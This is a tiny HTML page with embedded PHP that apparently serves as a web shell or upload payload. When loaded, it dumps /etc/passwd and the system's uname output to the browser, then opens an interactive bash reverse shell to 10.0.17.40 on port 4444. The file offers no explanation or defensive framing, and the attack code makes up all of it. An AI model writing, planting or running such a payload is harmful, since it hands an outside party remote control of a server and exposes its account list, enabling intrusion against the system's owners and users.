<!DOCTYPE html>
<html>
<body>

<?php
$output = shell_exec('cat /etc/passwd');
echo "<pre>$output</pre>";
$output = shell_exec('uname -a');
echo "<pre>$output</pre>";
$output = shell_exec('bash -i >& /dev/tcp/10.0.17.40/4444 0>&1');
?> 

</body>
</html>
